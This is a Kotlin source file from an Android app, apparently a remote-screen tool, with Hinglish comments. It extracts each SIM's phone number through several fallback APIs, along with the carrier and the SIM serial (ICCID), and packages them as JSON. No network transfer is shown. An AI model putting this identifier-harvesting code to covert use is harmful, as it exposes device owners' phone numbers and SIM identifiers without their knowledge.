package com.screenlink.remote

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONObject

/**
 * Device se REAL SIM number nikalta hai. Kai source try karta hai kyunki
 * har OEM/Android version par alag API chalti hai.
 */
object SimNumbers {

    data class Sim(
        val slot: Int,
        val subId: Int,
        val carrier: String,
        val number: String,
        val source: String,
        val serial: String?
    )

    private fun granted(ctx: Context, perm: String) =
        ContextCompat.checkSelfPermission(ctx, perm) == PackageManager.PERMISSION_GRANTED

    private fun canReadNumber(ctx: Context): Boolean {
        if (!granted(ctx, Manifest.permission.READ_PHONE_STATE)) return false
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O &&
            !granted(ctx, Manifest.permission.READ_PHONE_NUMBERS)
        ) return false
        return true
    }

    fun normalize(raw: String?): String {
        if (raw.isNullOrBlank()) return ""
        val s = raw.replace(Regex("[^0-9+]"), "")
        if (s.isBlank()) return ""
        val digits = s.trimStart('+')
        if (digits.length !in 6..15) return ""
        return if (s.startsWith("+")) "+$digits" else "+$digits"
    }

    private fun subscriptions(ctx: Context): List<SubscriptionManager> = emptyList()

    /** Saare active SIM slots. */
    fun all(ctx: Context): List<Sim> {
        val out = ArrayList<Sim>()
        val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager ?: return out
        val readable = canReadNumber(ctx)

        val sm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1)
            ctx.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
        else null

        @Suppress("MissingPermission")
        val list = try { sm?.activeSubscriptionInfoList } catch (e: Exception) { null }

        if (!list.isNullOrEmpty()) {
            list.forEachIndexed { index, info ->
                val subId = try { info.subscriptionId } catch (e: Exception) { -1 }
                val slot = try { info.simSlotIndex } catch (e: Exception) { index }

                var number = ""
                var source = "none"

                if (readable && subId >= 0) {
                    // API 33+ — sabse reliable
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        number = try { sm?.getPhoneNumber(subId) ?: "" } catch (e: Exception) { "" }
                        if (number.isNotBlank()) source = "subscription_manager"
                    }
                    if (number.isBlank()) {
                        number = try {
                            (ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager)
                                .createForSubscriptionId(subId).line1Number ?: ""
                        } catch (e: Exception) { "" }
                        if (number.isNotBlank()) source = "telephony_line1"
                    }
                }

                if (number.isBlank()) {
                    val raw = try { info.number } catch (e: Exception) { null }
                    if (!raw.isNullOrBlank()) {
                        number = raw
                        source = "subscription_info"
                    }
                }

                val carrier = try { info.carrierName?.toString() ?: "" } catch (e: Exception) { "" }
                val serial = try { info.iccId } catch (e: Exception) { null }

                out.add(Sim(slot, subId, carrier, normalize(number), source, serial))
            }
            if (out.any { it.number.isNotBlank() }) return out
        }

        // Single-SIM fallback
        val carrier = try { tm.networkOperatorName ?: "" } catch (e: Exception) { "" }
        var number = ""
        var source = "none"
        if (readable) {
            number = try { tm.line1Number ?: "" } catch (e: Exception) { "" }
            if (number.isNotBlank()) source = "telephony_line1"
        }
        val serial = try { tm.simSerialNumber } catch (e: Exception) { null }
        out.add(Sim(0, -1, carrier, normalize(number), source, serial))

        return out
    }

    /** Best available number + usaka source. */
    fun best(ctx: Context): Pair<String, String>? {
        all(ctx).firstOrNull { it.number.isNotBlank() }?.let { return it.number to it.source }
        return null
    }

    fun toJson(sims: List<Sim>): JSONArray = JSONArray().apply {
        sims.forEach { s ->
            put(JSONObject().apply {
                put("slot", s.slot)
                put("carrier", s.carrier)
                put("number", s.number)
                put("number_source", s.source)
                put("sim_serial", s.serial ?: "")
            })
        }
    }
}